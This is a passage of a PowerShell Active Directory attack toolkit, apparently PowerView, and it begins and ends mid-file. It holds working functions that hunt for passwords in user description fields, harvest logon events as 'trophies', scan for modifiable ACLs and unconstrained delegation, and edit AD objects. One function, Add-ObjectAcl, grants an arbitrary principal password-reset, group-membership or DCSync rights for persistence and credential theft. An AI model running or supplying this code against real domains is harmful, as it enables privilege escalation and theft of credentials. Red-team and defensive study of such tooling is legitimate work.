    .SYNOPSIS
        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.
        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    .PARAMETER Properties
        Property names to extract for users.
    .PARAMETER Domain
        The domain to query for user properties, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-UserProperty -Domain testing
        
        Returns all user properties for users in the 'testing' domain.
    .EXAMPLE
        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location
        
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.
    .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,
        
        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Properties) {
        # extract out the set of all properties for each object
        $Properties = ,"name" + $Properties
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | Select-Object -Property $Properties
    }
    else {
        # extract out just the property names
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


filter Find-UserField {
<#
    .SYNOPSIS
        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.
        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    .PARAMETER SearchTerm
        Term to search for, default of "pass".
    .PARAMETER SearchField
        User field to search, default of "description".
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER Domain
        Domain to search computer fields for, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Find-UserField -SearchField info -SearchTerm backup
        Find user accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',

        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )
 
    Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
}


filter Get-UserEvent {
<#
    .SYNOPSIS
        Dump and parse security events relating to an account logon (ID 4624)
        or a TGT request event (ID 4768). Intended to be used and tested on
        Windows 2008 Domain Controllers.
        Admin Reqd? YES
        Author: @sixdub
    .PARAMETER ComputerName
        The computer to get events from. Default: Localhost
    .PARAMETER EventType
        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'
    .PARAMETER DateStart
        Filter out all events before this date. Default: 5 days
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local
    .LINK
        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    Param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = $Env:ComputerName,

        [String]
        [ValidateSet("logon","tgt","all")]
        $EventType = "logon",

        [DateTime]
        $DateStart = [DateTime]::Today.AddDays(-5),

        [Management.Automation.PSCredential]
        $Credential
    )

    if($EventType.ToLower() -like "logon") {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like "tgt") {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }

    if($Credential) {
        Write-Verbose "Using alternative credentials"
        $Arguments = @{
            'ComputerName' = $ComputerName;
            'Credential' = $Credential;
            'FilterHashTable' = @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart};
            'ErrorAction' = 'SilentlyContinue';
        }
    }
    else {
        $Arguments = @{
            'ComputerName' = $ComputerName;
            'FilterHashTable' = @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart};
            'ErrorAction' = 'SilentlyContinue';            
        }
    }

    # grab all events matching our filter for the specified host
    Get-WinEvent @Arguments | ForEach-Object {

        if($ID -contains 4624) {    
            # first parse and check the logon event type. This could be later adapted and tested for RDP logons (type 10)
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }

            # interactive logons or domain logons
            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {
                    # parse and store the account used and the address they came from
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Domain = $Matches[0].split("`n")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $Address = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }

                    # only add if there was account information not for a machine or anonymous logon
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
                        $LogonEventProperties = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $Address
                            'ID' = '4624'
                            'LogonType' = $LogonType
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $LogonEventProperties
                    }
                }
                catch {
                    Write-Debug "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {
            # the TGT event type
            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split("`n")[1].split(":")[1].trim()
                        $Domain = $Matches[0].split("`n")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $Address = $Matches[0].split("`n")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $LogonEventProperties = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $Address
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $LogonEventProperties
            }
            catch {
                Write-Debug "Error parsing event logs: $_"
            }
        }
    }
}


function Get-ObjectAcl {
<#
    .SYNOPSIS
        Returns the ACLs associated with a specific active directory object.
        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.
    .PARAMETER SamAccountName
        Object name to filter for.        
    .PARAMETER Name
        Object name to filter for.
    .PARAMETER DistinguishedName
        Object distinguished name to filter for.
    .PARAMETER ResolveGUIDs
        Switch. Resolve GUIDs to their display names.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER ADSprefix
        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
    .PARAMETER RightsFilter
        Only return results with the associated rights, "All", "ResetPassword","WriteMembers"
    .PARAMETER Domain
        The domain to use for the query, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .EXAMPLE
        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local
        
        Get the ACLs for the matt.admin user in the testlab.local domain
    .EXAMPLE
        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs
        
        Get the ACLs for the matt.admin user in the testlab.local domain and
        resolve relevant GUIDs to their display names.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RightsFilter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize 

        # get a GUID -> name mapping
        if($ResolveGUIDs) {
            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {

        if ($Searcher) {

            if($SamAccountName) {
                $Searcher.filter="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
            else {
                $Searcher.filter="(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Object = [adsi]($_.path)

                    if($Object.distinguishedname) {
                        $Access = $Object.PsBase.ObjectSecurity.access
                        $Access | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]

                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $GuidFilter = Switch ($RightsFilter) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            Default { "00000000-0000-0000-0000-000000000000"}
                        }
                        if($_.ObjectType -eq $GuidFilter) { $_ }
                    }
                    else {
                        $_
                    }
                } | ForEach-Object {
                    if($GUIDs) {
                        # if we're resolving GUIDs, map them them to the resolved hash table
                        $AclProperties = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $AclProperties[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $AclProperties[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $AclProperties
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Add-ObjectAcl {
<#
    .SYNOPSIS
        Adds an ACL for a specific active directory object.
        
        AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3)
            https://adsecurity.org/?p=1906
        ACE setting method adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects.
        'ResetPassword' doesn't need to know the user's current password
        'WriteMembers' allows for the modification of group membership
    .PARAMETER TargetSamAccountName
        Target object name to filter for.        
    .PARAMETER TargetName
        Target object name to filter for.
    .PARAMETER TargetDistinguishedName
        Target object distinguished name to filter for.
    .PARAMETER TargetFilter
        A customized ldap filter string to use to find a target, e.g. "(description=*admin*)"
    .PARAMETER TargetADSpath
        The LDAP source for the target, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
    .PARAMETER TargetADSprefix
        Prefix to set for the target searcher (like "CN=Sites,CN=Configuration")
    .PARAMETER PrincipalSID
        The SID of the principal object to add for access.
    .PARAMETER PrincipalName
        The name of the principal object to add for access.
    .PARAMETER PrincipalSamAccountName
        The samAccountName of the principal object to add for access.
    .PARAMETER Rights
        Rights to add for the principal, "All","ResetPassword","WriteMembers","DCSync"
    .PARAMETER Domain
        The domain to use for the target query, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .EXAMPLE
        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john
        Grants 'john' all full access rights to the 'matt' account.
    .EXAMPLE
        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john -Rights ResetPassword
        Grants 'john' the right to reset the password for the 'matt' account.
    .LINK
        https://adsecurity.org/?p=1906
        
        https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,

        [String]
        $TargetName = "*",

        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",

        [String]
        $TargetFilter,

        [String]
        $TargetADSpath,

        [String]
        $TargetADSprefix,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,

        [String]
        $PrincipalName,

        [String]
        $PrincipalSamAccountName,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = "All",

        [String]
        $RightsGUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize

        if(!$PrincipalSID) {
            $Principal = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            
            if(!$Principal) {
                throw "Error resolving principal"
            }
            $PrincipalSID = $Principal.objectsid
        }
        if(!$PrincipalSID) {
            throw "Error resolving principal"
        }
    }

    process {

        if ($Searcher) {

            if($TargetSamAccountName) {
                $Searcher.filter="(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
            else {
                $Searcher.filter="(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    # adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects

                    $TargetDN = $_.Properties.distinguishedname

                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
                    $ControlType = [System.Security.AccessControl.AccessControlType] "Allow"
                    $ACEs = @()

                    if($RightsGUID) {
                        $GUIDs = @($RightsGUID)
                    }
                    else {
                        $GUIDs = Switch ($Rights) {
                            # ResetPassword doesn't need to know the user's current password
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            # allows for the modification of group membership
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                            # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                            # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                            #   when applied to a domain's ACL, allows for the use of DCSync
                            "DCSync" { "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "89e95b76-444d-4c62-991a-0facbeda640c"}
                        }
                    }

                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType
                    }

                    Write-Verbose "Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname)"

                    try {
                        # add all the new ACEs to the specified object
                        ForEach ($ACE in $ACEs) {
                            Write-Verbose "Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal $PrincipalSID '$Rights' on $TargetDN : $_"
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Invoke-ACLScanner {
<#
    .SYNOPSIS
        Searches for ACLs for specifable AD objects (default to all domain objects)
        with a domain sid of > -1000, and have modifiable rights.
        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.
    .PARAMETER SamAccountName
        Object name to filter for.        
    .PARAMETER Name
        Object name to filter for.
    .PARAMETER DistinguishedName
        Object distinguished name to filter for.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER ADSprefix
        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
    .PARAMETER Domain
        The domain to use for the query, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ResolveGUIDs
        Switch. Resolve GUIDs to their display names.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .EXAMPLE
        PS C:\> Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv
        Enumerate all modifable ACLs in the current domain, resolving GUIDs to display 
        names, and export everything to a .csv
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveGUIDs,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    # Get all domain ACLs with the appropriate parameters
    Get-ObjectACL @PSBoundParameters | ForEach-Object {
        # add in the translated SID for the object identity
        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {
        # check for any ACLs with SIDs > -1000
        try {
            # TODO: change this to a regex for speedup?
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {
        # filter for modifiable rights
        ($_.ActiveDirectoryRights -eq "GenericAll") -or ($_.ActiveDirectoryRights -match "Write") -or ($_.ActiveDirectoryRights -match "Create") -or ($_.ActiveDirectoryRights -match "Delete") -or (($_.ActiveDirectoryRights -match "ExtendedRight") -and ($_.AccessControlType -eq "Allow"))
    }
}


filter Get-GUIDMap {
<#
    .SYNOPSIS
        Helper to build a hash table of [GUID] -> resolved names
        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
    .PARAMETER Domain
    
        The domain to use for the query, defaults to the current domain.
    .PARAMETER DomainController
    
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .LINK
        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $SchemaPath = (Get-NetForest).schema.name

    $SchemaSearcher = Get-DomainSearcher -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize
    if($SchemaSearcher) {
        $SchemaSearcher.filter = "(schemaIDGUID=*)"
        try {
            $SchemaSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }

    $RightsSearcher = Get-DomainSearcher -ADSpath $SchemaPath.replace("Schema","Extended-Rights") -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    if ($RightsSearcher) {
        $RightsSearcher.filter = "(objectClass=controlAccessRight)"
        try {
            $RightsSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-NetComputer {
<#
    .SYNOPSIS
        This function utilizes adsisearcher to query the current AD context
        for current computer objects. Based off of Carlos Perez's Audit.psm1
        script in Posh-SecMod (link below).
    .PARAMETER ComputerName
        Return computers with a specific name, wildcards accepted.
    .PARAMETER SPN
        Return computers with a specific service principal name, wildcards accepted.
    .PARAMETER OperatingSystem
        Return computers with a specific operating system, wildcards accepted.
    .PARAMETER ServicePack
        Return computers with a specific service pack, wildcards accepted.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
    .PARAMETER Printers
        Switch. Return only printers.
    .PARAMETER Ping
        Switch. Ping each host to ensure it's up before enumerating.
    .PARAMETER FullData
        Switch. Return full computer objects instead of just system names (the default).
    .PARAMETER Domain
        The domain to query for computers, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    
    .PARAMETER SiteName
        The AD Site name to search for computers.
    .PARAMETER Unconstrained
        Switch. Return computer objects that have unconstrained delegation.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetComputer
        
        Returns the current computers in current domain.
    .EXAMPLE
        PS C:\> Get-NetComputer -SPN mssql*
        
        Returns all MS SQL servers on the domain.
    .EXAMPLE
        PS C:\> Get-NetComputer -Domain testing
        
        Returns the current computers in 'testing' domain.
    .EXAMPLE
        PS C:\> Get-NetComputer -Domain testing -FullData
        
        Returns full computer objects in the 'testing' domain.
    .LINK
        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem,

        [String]
        $ServicePack,

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $SiteName,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        # so this isn't repeated if multiple computer names are passed on the pipeline
        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize -Credential $Credential
    }

    process {

        if ($CompSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            # set the filters for the seracher if it exists
            if($Printers) {
                Write-Verbose "Searching for printers"
                # $CompSearcher.filter="(&(objectCategory=printQueue)$Filter)"
                $Filter += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if($OperatingSystem) {
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if($ServicePack) {
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if($SiteName) {
                $Filter += "(serverreferencebl=$SiteName)"
            }

            $CompFilter = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"
            Write-Verbose "Get-NetComputer filter : '$CompFilter'"
            $CompSearcher.filter = $CompFilter

            try {

                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {
                        # TODO: how can these results be piped to ping for a speedup?
                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($Up) {
                        # return full data objects
                        if ($FullData) {
                            # convert/process the LDAP fields for each result
                            Convert-LDAPProperty -Properties $_.Properties
                        }
                        else {
                            # otherwise we're just returning the DNS host name
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Get-ADObject {
<#
    .SYNOPSIS
        Takes a domain SID and returns the user, group, or computer object
        associated with it.
    .PARAMETER SID
        The SID of the domain object you're querying for.
    .PARAMETER Name
        The Name of the domain object you're querying for.
    .PARAMETER SamAccountName
        The SamAccountName of the domain object you're querying for. 
    .PARAMETER Domain
        The domain to query for objects, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER Filter
        Additional LDAP filter string for the query.
    .PARAMETER ReturnRaw
        Switch. Return the raw object instead of translating its properties.
        Used by Set-ADObject to modify object properties.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
        
        Get the domain object associated with the specified SID.
        
    .EXAMPLE
        PS C:\> Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
        
        Get the AdminSDHolder object for the testlab.local domain.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $ReturnRaw,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )
    process {
        if($SID) {
            # if a SID is passed, try to resolve it to a reachable domain name for the searcher
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $Canonical = Convert-ADName -ObjectName $Name -InputType NT4 -OutputType Canonical
                    if($Canonical) {
                        $Domain = $Canonical.split("/")[0]
                    }
                    else {
                        Write-Warning "Error resolving SID '$SID'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning "Error resolving SID '$SID' : $_"
                return $Null
            }
        }

        $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($ObjectSearcher) {
            if($SID) {
                $ObjectSearcher.filter = "(&(objectsid=$SID)$Filter)"
            }
            elseif($Name) {
                $ObjectSearcher.filter = "(&(name=$Name)$Filter)"
            }
            elseif($SamAccountName) {
                $ObjectSearcher.filter = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            $ObjectSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {
                    # convert/process the LDAP fields for each result
                    Convert-LDAPProperty -Properties $_.Properties
                }
            }
        }
    }
}


function Set-ADObject {
<#
    .SYNOPSIS
        Takes a SID, name, or SamAccountName to query for a specified
        domain object, and then sets a specified 'PropertyName' to a
        specified 'PropertyValue'.
    .PARAMETER SID
        The SID of the domain object you're querying for.
    .PARAMETER Name
        The Name of the domain object you're querying for.
    .PARAMETER SamAccountName
        The SamAccountName of the domain object you're querying for. 
    .PARAMETER Domain
        The domain to query for objects, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER Filter
        Additional LDAP filter string for the query.
    .PARAMETER PropertyName
        The property name to set.
    .PARAMETER PropertyValue
        The value to set for PropertyName
    .PARAMETER PropertyXorValue
        Integer value to binary xor (-bxor) with the current int value.
    .PARAMETER ClearValue
        Switch. Clear the value of PropertyName
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0
        
        Set the countrycode for matt.admin to 0
    .EXAMPLE
        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536
        
        Set the password not to expire on matt.admin
#>

    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,
